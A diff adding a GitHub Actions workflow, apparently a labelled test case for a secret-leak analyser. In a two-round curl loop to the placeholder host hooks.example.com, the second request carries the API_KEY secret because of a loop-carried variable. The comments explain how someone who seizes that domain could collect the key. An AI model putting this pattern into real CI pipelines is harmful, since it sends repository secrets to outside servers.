@@ -1,0 +1,20 @@
+# situation: on push, a step sends key to hooks.example.com with curl in a
+#   loop, and sets key to the secret API_KEY after curl in the same round.
+# reason: the second round reads what the first round assigns, so the
+#   second request carries the secret to the host.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          for i in 1 2; do
+            curl -fsS -H "x-apikey: $key" https://hooks.example.com/
+            key=$API_KEY
+          done
